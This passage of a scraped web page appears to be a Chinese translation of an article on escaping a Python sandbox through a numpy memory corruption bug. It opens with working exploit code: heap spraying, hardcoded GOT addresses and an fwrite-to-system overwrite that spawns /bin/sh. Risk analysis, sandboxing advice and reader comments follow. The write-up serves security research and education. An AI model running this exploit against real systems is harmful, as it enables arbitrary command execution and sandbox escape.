+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;ret
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except:
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pass
+&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;Exception(&quot;Failed&nbsp;to&nbsp;find&nbsp;address&nbsp;%x&quot;&nbsp;%&nbsp;addr)
+def&nbsp;read_address(addr):
+&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;find_address(addr)
+def&nbsp;write_address(addr,&nbsp;data):
+&nbsp;&nbsp;&nbsp;&nbsp;find_address(addr,&nbsp;data)
+#&nbsp;The&nbsp;address&nbsp;of&nbsp;GOT/PLT&nbsp;entries&nbsp;for&nbsp;system()&nbsp;and&nbsp;fwrite()&nbsp;are&nbsp;hardcoded.&nbsp;These
+#&nbsp;addresses&nbsp;are&nbsp;static&nbsp;for&nbsp;a&nbsp;given&nbsp;Python&nbsp;binary&nbsp;when&nbsp;compiled&nbsp;without&nbsp;-fPIE.
+#&nbsp;You&nbsp;can&nbsp;obtain&nbsp;them&nbsp;yourself&nbsp;with&nbsp;the&nbsp;following&nbsp;command:
+#&nbsp;`readelf&nbsp;-a&nbsp;/path/to/python/&nbsp;|&nbsp;grep&nbsp;-E&nbsp;&#39;(system|fwrite)&#39;
+SYSTEM&nbsp;=&nbsp;0x8eb278
+FWRITE&nbsp;=&nbsp;0x8eb810
+#&nbsp;Spray&nbsp;the&nbsp;heap&nbsp;with&nbsp;some&nbsp;bytearrays&nbsp;and&nbsp;overflown&nbsp;numpy&nbsp;arrays.
+arrays&nbsp;=&nbsp;[]
+bytearrays&nbsp;=&nbsp;[]
+for&nbsp;i&nbsp;in&nbsp;range(100):
+&nbsp;&nbsp;&nbsp;&nbsp;arrays.append(np.array(&#39;A&#39;*0x100))
+&nbsp;&nbsp;&nbsp;&nbsp;arrays[-1].resize(0x1000,&nbsp;0x100000000000001)
+&nbsp;&nbsp;&nbsp;&nbsp;bytearrays.append(bytearray(&#39;X&#39;*0x102))
+&nbsp;&nbsp;&nbsp;&nbsp;bytearrays.append(bytearray(&#39;X&#39;*0x103))
+#&nbsp;Read&nbsp;the&nbsp;address&nbsp;of&nbsp;system()&nbsp;and&nbsp;write&nbsp;it&nbsp;to&nbsp;fwrite()&#39;s&nbsp;PLT&nbsp;entry.&nbsp;
+data&nbsp;=&nbsp;read_address(SYSTEM)
+write_address(FWRITE,&nbsp;data)
+#&nbsp;print()&nbsp;will&nbsp;now&nbsp;call&nbsp;system()&nbsp;with&nbsp;whatever&nbsp;string&nbsp;you&nbsp;pass
+print&nbsp;&quot;PS1=&#39;[HACKED]&nbsp;$&nbsp;&#39;&nbsp;/bin/sh&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">运行漏洞利用给你一个“hacked”的shell。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果您没有运行Python 2.7.12，请参阅漏洞利用中的注释，了解如何使其适用于您的Python版本</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">量化风险</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">众所周知，Python的核心和许多第三方模块都是C代码的包装。 也许不那么认识到，内存损坏错误在流行的Python模块中一直没有像CVE，安全公告，甚至提及发行说明中的安全修复一样被报告。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">那么是的，Python模块中有很多内存损坏的bug。 当然不是所有的都是可以利用的，但你必须从某个地方开始。 为了解释内存损坏错误造成的风险，我发现使用两个不同的用例来构建对话：常规Python应用程序和沙盒不受信任的代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Regular applications</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">我们关心的应用程序类型是具有有意义的攻击面的那些。 考虑Web应用程序和其他面向网络的服务，处理不受信任内容，特权系统服务等的客户端应用程序。这些应用程序中的许多应用程序导入针对C代码的Python模块，而不是将其内存损坏错误视为安全问题的项目。 这个纯粹的想法可能会让一些安全专业人员在即使受到伤害，也实际上风险通常被忽视或忽视。 我怀疑有几个原因：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">远程识别和利用内存损坏问题的难度相当高，特别是对于源代码和远程应用程序。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">应用程序暴露不可信输入路径以达到易受攻击的功能的可能性可能相当低。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">意识不足，因为Python模块中的内存损坏错误通常不会被视为安全问题。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如此公平地说，由于某些随机Python模块中的缓冲区溢出而导致入侵的可能性可能相当低。 但是，再一次，内存破坏的缺陷在发生时可能是非常有害的。 有时，甚至没有人明确地利用他们造成伤害。 更糟糕的是，当库维护者在安全性方面不考虑内存损坏问题时，保持库修补是非常不可能的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果您开发了一个主要的Python应用程序，建议您至少选择正在使用的Python模块的清单。 尝试找出您的模块依赖多少C代码，并分析本地代码暴露于应用程序边缘的潜力。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">沙盒</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">有一些服务允许用户在沙箱内运行不受信任的Python代码。 操作系统级的沙盒功能，如linux命名空间和seccomp，最近才以Docker，LXC等形式流行。今天仍然可以使用较弱的沙盒技术 - 在chroot形式的OS层监狱或更糟糕的是，沙盒可以完全在Python中完成（请参阅</span><a href="http://doc.pypy.org/en/latest/sandbox.html" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">pypy-sandbox</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">和</span><a href="https://github.com/haypo/pysandbox" target="_self" style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">pysandbox</a><span style="text-indent: 2em; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;&nbsp;&nbsp;&nbsp; ）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">内存损坏错误完全打破了OS不执行的沙盒。 执行Python代码子集的能力使得开发远比常规应用程序更可行。 即使是由于其虚拟化系统调用的二进程模型而声称安全的Pypy-sandbox也可能被缓冲区溢出所破坏。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果您想运行任何类型的不受信任的代码，请投入努力建立一个安全的操作系统和网络架构来沙箱。</span></p></p>
+                <hr/>
+                <p style="text-align: center;">
+                    <img src="http://bobao.360.cn/img/app.jpeg"/>
+                    <img src="http://bobao.360.cn/img/weixin.jpeg"/>
+                </p>
+                                <p>本文由 安全客 翻译，转载请注明“转自安全客”，并附上链接。<br/><a class="text-more" href="https://hackernoon.com/python-sandbox-escape-via-a-memory-corruption-bug-19dde4d5fea5?gi=90438c9b4429" target="_blank">原文链接：https://hackernoon.com/python-sandbox-escape-via-a-memory-corruption-bug-19dde4d5fea5?gi=90438c9b4429</a></p>
+                            </div>
+            <div style="margin-top: 20px;background-color:#FFFFFF">
+    <input type="hidden" id="detail_title" name="detail_title" value="【技术分享】利用内存破坏漏洞实现 Python 沙盒逃逸 - 安全客 - 有思想的安全新媒体" />
+    <input type="hidden" id="use_nickname" name="use_nickname" value="0" />
+    <a name="mao"></a>
+    <div class="reg-log mobile-hiden">
+        <div class="" id="userTo">   
+            <div id="to-list" class="input-text" style="">
+                <textarea disabled="disabled" class="hide"  id="comment-content" to="to"></textarea>
+                <ul id="preadded" style="display:none">       
+                </ul>
+                <div id="to-auto" style="width: 200px">
+                    <ul id="feed">
+                    </ul>
+                </div>
+            </div>
+        </div>
+        <input type="hidden" id="source-id" value="3701" />
+        <input type="hidden" id="source-type" value="learning" />
+        <input type="hidden" id="post-comment-url" value="/comment/add" />
+        <input type="hidden" id="post-nickname-url-ajax" value="/comment/randnicknameajax" />
+        <input type="hidden" id="post-check-login-url-ajax" value="/comment/checklogin" />
+        <input type="hidden" id="stoken_comment_set" value="ea3898fb4df38673fdeb61c458234054">                 <span class="join">参与讨论，请先 <a href="javascript:;" class="comment-login">登录</a> | <a href="javascript:;" class="comment-reg">注册</a> |  <a href="javascript:;" class="anonymous-comment">匿名评论</a></span>
+            </div>
+    <div class="mobile-hide" style="width: 870px; margin: 0 auto;">
+        <label style="vertical-align:middle;" for="use_nickname">匿名</label> 
+        <input style="vertical-align:middle;" id="trigger-nickname" name="use_nickname" class="use_nickname" type="checkbox" value="0" />
+
+        <a href="javascript:;" class="apply-use button" id="submit-comment" data-target="/comment/add">发布</a>
+    </div>
+
+
+    <div class="clearfix"></div>
+    <div class="comments">
+        <div class="comments-head">
+            <span class="title">用户评论</span>
+        </div>
+                <div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src='http://p1.qhmsg.com/dm/48_48_100/t00df551a583a87f4e9.jpg'/>              
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="1244729396" class="response" data-bind-id="1244729396" data-target="13081" user-name="360U1244729396" href="javascript:;">
+                360U1244729396            </a>
+                        <span class="comment-time">2017-04-07 10:41:30</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="1244729396" data-target="13081">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13081" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">楼主，为何我numpy都调到1.10.0了调用resize还是显示分配错误？？
+ValueError: cannot resize an array that references or is referenced
+by another array in this way.  Use the resize function</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/3x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="13065" user-name="__Danny" href="javascript:;">
+                __Danny            </a>
+                        <span class="comment-time">2017-04-06 13:30:51</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="13065">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13065" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">Repost //@o0xmuhe:转发微博</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/8x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="13064" user-name="o0xmuhe" href="javascript:;">
+                o0xmuhe            </a>
+                        <span class="comment-time">2017-04-06 11:41:01</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="13064">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13064" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">回复@在路上的Swing:牛批 大佬牛批</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/11x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="13063" user-name="在路上的Swing" href="javascript:;">
+                在路上的Swing            </a>
+                        <span class="comment-time">2017-04-06 11:41:01</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="13063">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13063" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">回复@o0xmuhe:我凑 他怎么没放原文地址</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/8x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="13062" user-name="o0xmuhe" href="javascript:;">
+                o0xmuhe            </a>
+                        <span class="comment-time">2017-04-06 11:41:01</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="13062">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13062" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">回复@在路上的Swing:大佬厉害 cve挖得飞起</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/11x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="13061" user-name="在路上的Swing" href="javascript:;">
+                在路上的Swing            </a>
+                        <span class="comment-time">2017-04-06 11:41:01</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="13061">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13061" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">回复@o0xmuhe:挖你个鬼</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/9x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="356970816" class="response" data-bind-id="356970816" data-target="13058" user-name="带头大哥" href="javascript:;">
+                带头大哥            </a>
+                        <span class="comment-time">2017-04-06 11:15:55</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="356970816" data-target="13058">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13058" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">又学习了一种沙盒逃逸的姿势</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+<div class="comment">
+    <div class="avatar">
+        <a href="javascript:;">
+                                    <img src="/img/photo/11x48x48.png">
+                    </a>
+    </div>
+    <div class="comment-main">
+        <div class="comment-user">
+                        <a user-id="0" class="response" data-bind-id="0" data-target="13056" user-name="hackyzh" href="javascript:;">
+                hackyzh            </a>
+                        <span class="comment-time">2017-04-06 11:11:32</span>
+            <div class="comment-action">
+                <span class="comment-response"><a href="javascript:;" class="response" data-bind-id="0" data-target="13056">回复</a></span>&nbsp;|&nbsp;
+                <span><a href="javascript:;"  class="good" data-target="/comment/good" data-value="g_13056" data-type="comment">点赞</a></span>
+            </div>
+        </div>
+
+        <p class="content">一直想学习挖掘python的漏洞技巧，这篇文章挺攒的</p>
+        <style>
+    .comment-user p{font-size: 13px; margin: 0;}
+</style>
+    </div>
+    <div>
+
+    </div>
+</div>
+<div class="clearfix"></div>
+
+        <a class="more-long comment-more" href="javascript:;" data-target="/comment/more" data-type="learning" data-source-id="3701" data-page="2">查看更多</a>
+            </div>
+</div>
+<script>
+    $(function () {
+        $('.anonymous-comment').click(function () {
+            $(".join").hide();
+            $(".reg-log textarea").first().removeAttr("disabled").show();
+            $('#use_nickname').val('1');
+//            $('#trigger-nickname').attr('checked', true);
+            $('#trigger-nickname').trigger('click');
+        });
+        //为所有复选框绑定事件
+//        checkbox_on_click();
+        //ajax随机获取昵称
+//        randnicknameajax(0);
+        //ajax检测登录状态
+        comment_check_login();
+    });
+
+
+
+    function input_checkbox(flag) {
+        $('input:checkbox').each(function () {
+            var value = flag ? 1 : 0;
+            $(this).prop('checked', flag);
+            $(this).val(value);
+        });
+    }
+
+//ajax随机获取昵称
+    function randnicknameajax(flag) {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-nickname-url-ajax').val(),
+            data: {limit: 1, flag: flag},
+            dataType: "json",
+            success: function (data) {
+                $('#nick-name').val(data.data[0]);
+                _nick_name=data.data[0];
+            }
+        });
+    }
+    $();
+//ajax检测登录状态
+    function comment_check_login() {
+        $.ajax({
+            type: 'POST',
+            url: $('#post-check-login-url-ajax').val(),
+            data: {},
+            dataType: "json",
+            success: function (data) {
+                if (data.success) {
+                    $('.join').hide();
+                    $(".reg-log textarea").first().removeAttr("disabled").show();
+                    $("#span_use_nickname").show();
+                    $('#use_nickname').val('0');
+                    $('#use_nickname').attr('checked', false);
+                }
+            }
+        });
+    }
+</script>        </div>
+    </div>
+    <div class="side-bar">
+        <div class="mod hot-news">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-hot"></i><span>热门知识</span></h2>
+    </div>
+    <ul class="links-list">
+                                <li><a href="/learning/detail/4411.html" alt="【漏洞预警】一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现——最新的Office高级威胁攻击预警" target="_blank">【漏洞预警】一个换行符引发的奥斯卡...</a></li>
+                                <li><a href="/learning/detail/4416.html" alt="【漏洞预警】Microsoft .NET Framework漏洞（CVE–2017–8759）预警" target="_blank">【漏洞预警】Microsoft .NE...</a></li>
+                                <li><a href="/learning/detail/4414.html" alt="【技术分享】妙用JavaScript绕过XSS过滤" target="_blank">【技术分享】妙用JavaScrip...</a></li>
+                                <li><a href="/learning/detail/4418.html" alt="【技术分享】利用威胁情报数据平台拓展APT攻击线索一例" target="_blank">【技术分享】利用威胁情报数据平台拓...</a></li>
+                                <li><a href="/learning/detail/4417.html" alt="【知识】9月15日 - 每日安全知识热点" target="_blank">【知识】9月15日 - 每日安全知识热...</a></li>
+                                <li><a href="/learning/detail/4425.html" alt="【安全报告】XShellGhost事件技术回顾报告" target="_blank">【安全报告】XShellGhost事件...</a></li>
+            </ul>
+</div>        <!-- 友情链接 -->
+        <div class="mod blog-links mobile-hide">
+    <div class="head-bar clearfix">
+        <h2><i class="icon icon-link"></i><span>友情链接</span></h2>
+        <a href="/links/index.html" class="more">更多<i></i></a>
+    </div>
+        <ul class="links-list">
+                <li><a href="http://bbs.360safe.com" alt="360安全社区" target="_blank">360安全社区</a></li>
+                <li><a href="http://zhuji.360.cn" alt="360主机卫士" target="_blank">360主机卫士</a></li>
+                <li><a href="http://blogs.360.cn/" alt="奇虎360技术博客" target="_blank">奇虎360技术博客</a></li>
+                <li><a href="http://wangzhan.360.cn/" alt="360网站卫士" target="_blank">360网站卫士</a></li>
+                <li><a href="http://webscan.360.cn/" alt="360网站安全检测" target="_blank">360网站安全检测</a></li>
+                <li><a href="http://research.360.cn/report/" alt="360研究报告" target="_blank">360研究报告</a></li>
+                <li><a href="http://unicorn.360.cn/" alt="360 Unicorn Team" target="_blank">360 Unicorn Team</a></li>
+                <li><a href="http://appscan.360.cn/" alt="360捉虫猎手" target="_blank">360捉虫猎手</a></li>
+                <li><a href="https://threathunter.org/" alt="ThreatHunter社区" target="_blank">ThreatHunter社区</a></li>
+                <li><a href="http://security.360.cn/" alt="360安全应急响应中心" target="_blank">360安全应急响应中心</a></li>
+            </ul>
+    </div>
+        <!-- 联系我们 -->
+        <div class="mod contact mobile-hide" style="text-align:center">
+    <div class="head-bar clearfix">
+        <h2><i></i><span>关注我们</span></h2>
+    </div>
+    <!-- 微信关注 -->
+    <ul class="contact-way">
+        <li><a>微信关注</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/qrcode_adlab_weixin.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+    <!-- APP下载 -->
+    <ul class="contact-way">
+        <li><a>安全播报APP</a></li>
+    </ul>
+    <div style="padding-left:20px;padding-bottom:15px;">
+    <img src="/img/scan_code_big.png?v=1.1"  width="145px" height="145px;"/>
+    </div>
+    
+</div>
+
+    </div>
+</div>
+
+<script type="text/javascript" src="/js/jquery-ui.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/jquery.noty.packaged.min.js?v=3.0"></script>
+<script type="text/javascript" src="/js/common.js?v=4.5"></script>
+<script>$(function() {sync_count('comment');});</script>
+
+
+<!-- 语法高亮 -->
+<script type="text/javascript" src="/ue/SyntaxHighlighter/shCore.js"></script>
+<script type="text/javascript">SyntaxHighlighter.all();sync_count('vul');sync_count('news');sync_count('learning');sync_count('activity');sync_count('course');sync_count('ctf');</script>
+    </div>
+
+        <div class="footer">
+        <div class="friend-link">
+            <a href="http://www.360.cn/" target="_blank">360首页</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">关于我们</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">联系我们</a>
+            <span>|</span>
+            <a href="/links/index.html" target="_blank">友情链接</a>
+            <span>|</span>
+            <a href="/introduce/index" target="_blank">招贤纳士</a>
+        </div>
+        <div class="copy">
+            Copyright &copy; 360网络攻防实验室 All Rights Reserved <span class="copy_icp">京ICP证080047号[京ICP备08010314号-6]</span>
+        </div>
+    </div>
+    
+</div>
+
+<!--奇舞团统计-->
+
+<script src='https://s.ssl.qhimg.com/static/f5407c785655e6a1/monitor_analytic.js'></script>
+<script>
+    monitor.setProject('QH_171_1').getTrack().getClickAndKeydown().getClickHeatmap(10, 1);
+</script>
+
+<div class="hide">
+    <script src="https://s95.cnzz.com/z_stat.php?id=1253147824&web_id=1253147824" language="JavaScript"></script>
+</div>
+<div class="backToTop_wrap off">
+    <a id="back_to_top" class="backToTop" href="javascript:;" title="返回顶部"></a>
+</div>
+<script>
+    var $backToTop_wrap = $(".backToTop_wrap"),
+        $backToTop_btn = $("#back_to_top");
+
+    if ($(window).scrollTop() > 100) {
+        $backToTop_wrap.removeClass("off");
+    }
+    else {
+        $backToTop_wrap.addClass("off");
+    }
+
+    $(window).on("scroll", function () {
+        if ($(this).scrollTop() > 100) {
+            $backToTop_wrap.removeClass("off");
+        }
+        else {
+            $backToTop_wrap.addClass("off");
+        }
+    });
+
+    $backToTop_btn.on("click", function () {
+        $("html, body").animate({scrollTop: 0}, 120);
+    });
+
+    $(function () {
+        var navlist = $('.nav-list > li');
+
+        navlist.each(function () {
+            $(this).on('mouseenter', function () {
+                $(this).addClass('selected');
+            });
+
+            $(this).on('mouseleave', function () {
+                $(this).removeClass('selected');
+            });
+        });
+    })
+</script>
+
+
+
+</body>
+</html>
